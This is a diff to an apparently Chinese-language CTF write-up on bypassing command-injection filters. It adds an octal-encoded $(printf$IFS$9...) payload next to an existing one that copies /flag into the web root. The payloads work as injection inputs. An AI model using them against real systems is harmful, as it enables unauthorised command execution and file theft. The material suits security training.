@@ -66,7 +66,11 @@ a=g;fla$a
 ls `cat /flag > /var/www/html/1.txt`
 ```
 
+或者使用 $() 和八进制
 
+```
+$(printf$IFS$9"\154\163")
+```
 
 另附一份无回显盲注脚本
 
